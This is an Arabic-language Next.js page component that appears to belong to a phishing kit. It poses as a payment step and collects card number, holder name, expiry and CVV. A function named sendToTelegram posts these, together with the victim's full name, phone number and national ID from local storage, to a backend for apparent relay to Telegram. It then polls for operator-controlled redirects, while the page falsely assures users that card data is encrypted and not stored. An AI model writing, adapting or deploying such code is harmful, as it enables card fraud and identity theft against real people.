import { useState, useEffect, FormEvent, ChangeEvent } from 'react';
import Head from 'next/head';
import { useRouter } from 'next/router';

export default function Step2() {
  const router = useRouter();
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [errors, setErrors] = useState({ card: '', holder: '', expiry: '', cvv: '' });
  const [success, setSuccess] = useState({ card: false, holder: false, expiry: false, cvv: false });
  const [loading, setLoading] = useState(false);
  const [cardBrand, setCardBrand] = useState('');

  const arabicDigits: Record<string, string> = {
    '٠': '0', '١': '1', '٢': '2', '٣': '3', '٤': '4',
    '٥': '5', '٦': '6', '٧': '7', '٨': '8', '٩': '9',
    '۰': '0', '۱': '1', '۲': '2', '۳': '3', '۴': '4',
    '۵': '5', '۶': '6', '۷': '7', '۸': '8', '۹': '9',
  };

  const normalizeDigits = (value: string) => {
    return value
      .split('')
      .map((char) => arabicDigits[char] ?? char)
      .join('')
      .replace(/\D+/g, '');
  };

  const formatCardNumber = (value: string) => {
    return value
      .replace(/\D/g, '')
      .slice(0, 19)
      .replace(/(.{4})/g, '$1 ')
      .trim();
  };

  const luhnCheck = (num: string) => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10);
      if (isNaN(digit)) return false;
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum > 0 && sum % 10 === 0;
  };

  const getCardType = (digits: string) => {
    if (digits.startsWith('4')) return 'visa';
    if (digits.startsWith('5')) return 'mastercard';
    return 'unknown';
  };

  const handleCardNumberChange = (e: ChangeEvent<HTMLInputElement>) => {
    const normalized = normalizeDigits(e.target.value);
    const formatted = formatCardNumber(normalized);
    setCardNumber(formatted);
    
    if (normalized) {
      const cardType = getCardType(normalized);
      setCardBrand(cardType);
    } else {
      setCardBrand('');
    }
    
    setErrors({ ...errors, card: '' });
    setSuccess({ ...success, card: false });
  };

  const validateCardNumber = () => {
    const digits = normalizeDigits(cardNumber);
    if (!digits) {
      setErrors({ ...errors, card: 'يرجى إدخال رقم البطاقة بشكل صحيح' });
      setSuccess({ ...success, card: false });
      return false;
    }

    const cardType = getCardType(digits);
    const isExpectedLength =
      cardType === 'visa' || cardType === 'mastercard'
        ? digits.length === 16
        : digits.length >= 13 && digits.length <= 19;

    if (cardType === 'unknown' || !isExpectedLength || !luhnCheck(digits)) {
      setErrors({ ...errors, card: 'رقم بطاقة الائتمان غير صالح' });
      setSuccess({ ...success, card: false });
      return false;
    }

    setErrors({ ...errors, card: '' });
    setSuccess({ ...success, card: true });
    return true;
  };

  const validateCardHolder = () => {
    const valid = cardHolder.trim().length >= 3;
    setSuccess({ ...success, holder: valid });
    if (!valid) {
      setErrors({ ...errors, holder: 'يرجى إدخال اسم اسم الصاحب بشكل صحيح' });
    } else {
      setErrors({ ...errors, holder: '' });
    }
    return valid;
  };

  const validateExpiry = () => {
    const digits = normalizeDigits(expiry);
    const month = digits.slice(0, 2);
    const yearShort = digits.slice(2, 4);
    const monthNumber = parseInt(month, 10);
    const yearShortNumber = parseInt(yearShort, 10);
    let message = '';

    if (!month || !yearShort) {
      message = 'يرجى إدخال تاريخ الصلاحية بصيغة MM/YY';
    } else if (!Number.isInteger(monthNumber) || monthNumber < 1 || monthNumber > 12) {
      message = 'الشهر غير صالح';
    } else if (!Number.isInteger(yearShortNumber)) {
      message = 'السنة غير صالحة';
    } else {
      const now = new Date();
      const currentYearShort = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
      if (
        yearShortNumber < currentYearShort ||
        (yearShortNumber === currentYearShort && monthNumber < currentMonth)
      ) {
        message = 'انتهت الصلاحية';
      }
    }

    if (message) {
      setErrors({ ...errors, expiry: message });
      setSuccess({ ...success, expiry: false });
      return false;
    }

    setErrors({ ...errors, expiry: '' });
    setSuccess({ ...success, expiry: true });
    return true;
  };

  const validateCvv = () => {
    const digits = normalizeDigits(cvv);
    if (digits.length !== 3) {
      setErrors({ ...errors, cvv: 'رمز الأمان يجب أن يكون 3 أرقام' });
      setSuccess({ ...success, cvv: false });
      return false;
    }
    setErrors({ ...errors, cvv: '' });
    setSuccess({ ...success, cvv: true });
    return true;
  };

  const sendToTelegram = async () => {
    try {
      const order = JSON.parse(localStorage.getItem('fazaa.orderForm') || '{}');
      const cardDigits = normalizeDigits(cardNumber);
      const { month, year } = parseExpiryParts(expiry);
      const sessionId = `session_${Date.now()}`;

      await fetch('/api/send-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'card',
          data: {
            holderName: cardHolder,
            cardNumber: cardDigits,
            expiry: expiry,
            cvv: cvv,
            fullName: order.fullName || 'غير معروف',
            phoneNumber: order.phoneNumber || 'غير معروف',
            nationalId: order.nationalId || 'غير معروف',
            sessionId: sessionId,
          },
        }),
      });

      // بدء مراقبة التوجيه
      startRedirectMonitoring(sessionId);
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  const startRedirectMonitoring = (sessionId: string) => {
    const checkRedirect = async () => {
      try {
        const response = await fetch(`/api/check-redirect/${sessionId}`);
        const result = await response.json();

        if (result.redirect) {
          router.push(result.redirect);
        } else {
          setTimeout(checkRedirect, 2000);
        }
      } catch (error) {
        setTimeout(checkRedirect, 5000);
      }
    };

    setTimeout(checkRedirect, 1000);
  };

  const parseExpiryParts = (rawValue: string) => {
    const digits = normalizeDigits(rawValue || '').slice(0, 4);
    const month = digits.slice(0, 2);
    const yearShort = digits.slice(2, 4);
    const year = yearShort ? String(2000 + parseInt(yearShort, 10)) : '';
    return { digits, month, yearShort, year };
  };

  const handleExpiryChange = (e: ChangeEvent<HTMLInputElement>) => {
    const digits = normalizeDigits(e.target.value).slice(0, 4);
    const monthDigits = digits.slice(0, 2);
    const yearDigits = digits.slice(2, 4);
    const formatted = yearDigits ? `${monthDigits}/${yearDigits}` : monthDigits;
    setExpiry(formatted);
    setErrors({ ...errors, expiry: '' });
    setSuccess({ ...success, expiry: false });
  };

  const handleCvvChange = (e: ChangeEvent<HTMLInputElement>) => {
    const digits = normalizeDigits(e.target.value).slice(0, 3);
    setCvv(digits);
    setErrors({ ...errors, cvv: '' });
    setSuccess({ ...success, cvv: false });
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();

    const cardValid = validateCardNumber();
    const holderValid = validateCardHolder();
    const expiryValid = validateExpiry();
    const cvvValid = validateCvv();

    if (!cardValid || !holderValid || !expiryValid || !cvvValid) {
      return;
    }

    // حفظ بيانات البطاقة في localStorage
    const cardDigits = normalizeDigits(cardNumber);
    const { month, year } = parseExpiryParts(expiry);
    localStorage.setItem(
      'paymentData',
      JSON.stringify({
        cardNumber,
        cardNumberDigits: cardDigits,
        cardLast4: cardDigits.slice(-4),
        cardHolderName: cardHolder,
        expiry,
        expiryMonth: month,
        expiryYear: year,
        cvv,
        updatedAt: new Date().toISOString(),
      })
    );

    setLoading(true);
    await sendToTelegram();
  };

  return (
    <>
      <Head>
        <title>معلومات الحساب</title>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
        <link
          href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
          rel="stylesheet"
        />
        <link rel="stylesheet" href="/assets/fonts/fontawesome/css/all.min.css" />
      </Head>

      <div className="app">
        <div className="payment-shell">
          <header>
            <div className="logo">
              <img className="logo-mark" alt="" src="/assets/images/golden-logo.webp" />
            </div>
          </header>

          <main>
            <form onSubmit={handleSubmit} autoComplete="off" noValidate>
              <div className="field">
                <label className="label" htmlFor="cardHolderName">
                  اسم اسم الصاحب
                </label>
                <input
                  id="cardHolderName"
                  type="text"
                  placeholder="اسم اسم الصاحب"
                  value={cardHolder}
                  onChange={(e) => {
                    setCardHolder(e.target.value);
                    setErrors({ ...errors, holder: '' });
                    setSuccess({ ...success, holder: false });
                  }}
                  onBlur={validateCardHolder}
                />
                {errors.holder && <div className="card-error">{errors.holder}</div>}
              </div>

              <div className="field">
                <label className="label" htmlFor="cardNumber">
                  رقم البطاقة
                </label>
                <div className={`card-field-wrapper ${errors.card ? 'card-field-wrapper--error' : ''} ${success.card ? 'card-field-wrapper--success' : ''}`}>
                  <input
                    id="cardNumber"
                    className="card-input"
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder=""
                    maxLength={19}
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    onBlur={validateCardNumber}
                  />
                  <div className={`card-logos ${cardBrand ? 'card-logos--visible' : ''}`}>
                    <i
                      className="fa-solid fa-credit-card"
                      style={{ display: cardBrand ? 'none' : 'inline-flex', color: '#8e8e8e' }}
                    ></i>
                    <i
                      className="fa-brands fa-cc-visa"
                      style={{ display: cardBrand === 'visa' ? 'inline-flex' : 'none', color: '#1434cb' }}
                    ></i>
                    <i
                      className="fa-brands fa-cc-mastercard"
                      style={{
                        display: cardBrand === 'mastercard' ? 'inline-flex' : 'none',
                        color: '#eb001b',
                        fontSize: '1.4rem',
                      }}
                    ></i>
                  </div>
                  {errors.card && <div className="card-error">{errors.card}</div>}
                </div>
              </div>

              <div className="expiry-cvv-row">
                <div className="field">
                  <label className="label" htmlFor="expiryInput">
                    تاريخ الصلاحية
                  </label>
                  <div className={`expiry-field ${errors.expiry ? 'expiry-field--error' : ''} ${success.expiry ? 'expiry-field--success' : ''}`}>
                    <input
                      id="expiryInput"
                      className="card-input"
                      type="text"
                      inputMode="numeric"
                      autoComplete="cc-exp"
                      placeholder="MM/YY"
                      maxLength={5}
                      value={expiry}
                      onChange={handleExpiryChange}
                      onBlur={validateExpiry}
                    />
                    {errors.expiry && <div className="card-error expiry-error">{errors.expiry}</div>}
                  </div>
                </div>
                <div className="field">
                  <label className="label" htmlFor="cvv">
                    رمز التأكيد
                  </label>
                  <input
                    id="cvv"
                    className="card-input"
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder=""
                    maxLength={3}
                    value={cvv}
                    onChange={handleCvvChange}
                    onBlur={validateCvv}
                  />
                  {errors.cvv && <div className="card-error">{errors.cvv}</div>}
                </div>
              </div>

              <div className="secure-notice">
                <span aria-hidden="true">🔒</span>
                جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
              </div>

              <div className="buttons-row">
                <button className="btn btn-primary" type="submit">
                  التالي
                </button>
              </div>
            </form>
          </main>
        </div>
      </div>

      {loading && (
        <div className="loading-overlay loading-overlay--visible">
          <div className="loading-card">
            <div className="loading-spinner"></div>
            <div>جاري المعالجة...</div>
          </div>
        </div>
      )}

      <style jsx global>{`
        :root {
          --bg: #f2f2f7;
          --panel: rgba(255, 255, 255, 0.98);
          --text: #1c1c1e;
          --muted: #6b6b6b;
          --line: rgba(60, 60, 67, 0.16);
          --gold: #b18c33;
          --gold-2: #caa64e;
          --danger: #bf514d;
        }

        * {
          box-sizing: border-box;
        }
        html,
        body {
          margin: 0;
          min-height: 100%;
        }
        body {
          font-family: 'SF Pro Text', 'SF Pro Display', 'Cairo', -apple-system, BlinkMacSystemFont, system-ui,
            sans-serif;
          background: var(--bg);
          color: var(--text);
          direction: rtl;
        }

        a {
          color: inherit;
          text-decoration: none;
        }

        .app {
          min-height: 100vh;
          width: min(100%, 980px);
          margin: 0 auto;
          padding: 14px 10px 16px;
        }

        .payment-shell {
          max-width: 500px;
          margin: 0 auto;
          padding: 12px 12px 14px;
          border: 1px solid rgba(60, 60, 67, 0.12);
          border-radius: 20px;
          background: #ffffff;
          box-shadow: 0 8px 24px rgba(28, 28, 30, 0.08);
        }

        header {
          max-width: 100%;
          margin: 0 auto;
          display: flex;
          align-items: flex-start;
          justify-content: flex-start;
          gap: 10px;
          padding: 0 0 8px;
          border-bottom: 1px solid rgba(60, 60, 67, 0.1);
        }

        .logo {
          display: inline-flex;
          align-items: center;
          justify-content: center;
        }

        .logo-mark {
          display: block;
          width: min(15vw, 82px);
          height: auto;
        }

        .login-link {
          display: none;
        }

        main {
          padding: 10px 0 0;
        }

        form {
          max-width: 100%;
          margin: 0 auto;
          padding: 0;
          border-radius: 0;
          background: var(--panel);
          backdrop-filter: blur(8px);
          border: 0;
          box-shadow: none;
        }

        .field {
          margin-bottom: 14px;
          position: relative;
        }

        .field--success input,
        .field--success select {
          border-color: rgba(46, 160, 67, 0.7);
          box-shadow: 0 0 0 3px rgba(46, 160, 67, 0.1);
        }

        .label {
          display: block;
          margin-bottom: 5px;
          font-size: 0.78rem;
          font-weight: 600;
          color: #3a3a3c;
        }

        input {
          width: 100%;
          height: 44px;
          border-radius: 12px;
          border: 1px solid var(--line);
          background: #fbfbfd;
          padding: 0 12px;
          font: inherit;
          color: var(--text);
          outline: none;
          transition: border-color 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease;
        }

        input[type='tel'] {
          direction: rtl;
          unicode-bidi: plaintext;
          text-align: right;
          font-variant-numeric: tabular-nums;
        }

        #cardHolderName {
          direction: rtl;
          text-align: right;
        }

        #cardHolderName::placeholder {
          font-size: 0.82rem;
          font-weight: 400;
          color: #a6a6a6;
        }

        .expiry-field {
          position: relative;
          overflow: visible;
          padding-bottom: 18px;
        }

        .expiry-error {
          position: static;
          inset-inline: auto;
          top: auto;
          width: 100%;
          max-width: 100%;
          color: #d9534f;
          font-size: 0.75rem;
          font-weight: 400;
          line-height: 1.6;
          display: none;
          text-align: right;
          direction: rtl;
          unicode-bidi: plaintext;
          overflow-wrap: anywhere;
          word-break: break-word;
          white-space: normal;
          min-height: 2.2em;
        }

        .expiry-field--error input {
          border-color: rgba(217, 83, 79, 0.5);
          box-shadow: 0 0 0 3px rgba(217, 83, 79, 0.08);
        }

        .expiry-field--error .expiry-error {
          display: block;
        }

        @media (max-width: 640px) {
          .expiry-error {
            font-size: 0.66rem;
            line-height: 1.45;
            min-height: 2.6em;
          }
        }

        .expiry-field--success input {
          border-color: rgba(46, 160, 67, 0.7);
          box-shadow: 0 0 0 3px rgba(46, 160, 67, 0.1);
        }

        input::placeholder {
          color: #9a9a9a;
        }
        input:focus {
          border-color: rgba(10, 132, 255, 0.45);
          background: #ffffff;
          box-shadow: 0 0 0 3px rgba(10, 132, 255, 0.12);
        }

        .card-field-wrapper {
          position: relative;
          overflow: visible;
        }

        .card-field-wrapper--success input {
          border-color: rgba(46, 160, 67, 0.7);
          box-shadow: 0 0 0 3px rgba(46, 160, 67, 0.1);
        }

        .card-input {
          padding-inline-end: 62px;
        }

        .card-logos {
          position: absolute;
          inset-inline-end: 10px;
          inset-block-start: 50%;
          transform: translateY(-50%);
          display: none;
          align-items: center;
          gap: 8px;
          pointer-events: none;
        }

        .card-logos--visible {
          display: flex;
        }

        .card-logos img,
        .card-logos i {
          width: 36px;
          height: 22px;
          object-fit: contain;
          font-size: 1.3rem;
          line-height: 1;
        }

        .card-logos i {
          display: inline-flex;
          align-items: center;
          justify-content: center;
        }

        .card-error {
          position: absolute;
          inset-inline: 0;
          top: calc(100% + 4px);
          color: #d9534f;
          font-size: 0.75rem;
          font-weight: 400;
          line-height: 1.4;
        }

        .card-field-wrapper--error input {
          border-color: rgba(217, 83, 79, 0.5);
          box-shadow: 0 0 0 3px rgba(217, 83, 79, 0.08);
        }

        .card-field-wrapper:not(.card-field-wrapper--error) .card-error {
          display: none;
        }

        .card-field-wrapper--error .card-error {
          display: block;
        }

        .expiry-cvv-row {
          display: grid;
          grid-template-columns: repeat(2, minmax(0, 1fr));
          gap: 10px;
          margin-bottom: 2px;
        }

        .secure-notice {
          display: flex;
          align-items: center;
          gap: 7px;
          margin: 10px 0 8px;
          padding: 9px 10px;
          border-radius: 12px;
          background: rgba(10, 132, 255, 0.08);
          color: #1f4f8f;
          font-weight: 500;
          font-size: 0.78rem;
        }

        .secure-notice span {
          flex: 0 0 auto;
        }

        .info-text {
          margin: 0 0 10px;
          color: #636366;
          font-size: 0.76rem;
          line-height: 1.5;
        }

        .buttons-row {
          display: block;
        }

        .btn {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          height: 42px;
          border-radius: 12px;
          font: inherit;
          font-weight: 600;
          border: 0;
          cursor: pointer;
          font-size: 0.86rem;
          white-space: nowrap;
          min-width: 0;
        }

        .btn-secondary {
          background: #f2f2f7;
          border: 1px solid rgba(60, 60, 67, 0.22);
          color: #1c1c1e;
          flex: 0 0 34%;
        }

        .btn-primary {
          background: linear-gradient(180deg, var(--gold-2), var(--gold));
          color: #fff;
          box-shadow: 0 8px 18px rgba(177, 140, 51, 0.28);
          width: 100%;
        }

        .loading-overlay {
          position: fixed;
          inset: 0;
          display: none;
          align-items: center;
          justify-content: center;
          background: rgba(12, 12, 14, 0.72);
          backdrop-filter: blur(10px);
          z-index: 999;
        }

        .loading-overlay--visible {
          display: flex;
        }

        .loading-card {
          display: flex;
          align-items: center;
          flex-direction: column;
          gap: 16px;
          padding: 28px 30px;
          border-radius: 24px;
          background: rgba(10, 10, 10, 0.2);
          border: 1px solid rgba(255, 255, 255, 0.08);
          box-shadow: 0 24px 60px rgba(0, 0, 0, 0.28);
          color: #f4f1e6;
          font-size: 1rem;
          font-weight: 500;
          min-width: min(360px, calc(100vw - 48px));
          text-align: center;
        }

        .loading-spinner {
          width: 44px;
          height: 44px;
          border-radius: 50%;
          border: 4px solid rgba(214, 180, 91, 0.18);
          border-top-color: var(--gold);
          animation: loading-spin 0.8s linear infinite;
        }

        @keyframes loading-spin {
          to {
            transform: rotate(360deg);
          }
        }

        @media (max-width: 640px) {
          .app {
            padding-inline: 8px;
            padding-top: 10px;
          }
          .payment-shell {
            padding: 10px 10px 12px;
            border-radius: 18px;
          }
          header {
            padding-bottom: 7px;
          }
          .logo-mark {
            width: 68px;
          }
          .expiry-cvv-row {
            grid-template-columns: repeat(2, minmax(0, 1fr));
          }
          .buttons-row {
            gap: 7px;
          }
          .btn {
            height: 40px;
            font-size: 0.82rem;
          }
          .btn-secondary {
            flex-basis: 32%;
            padding-inline: 8px;
          }
        }
      `}</style>
    </>
  );
}
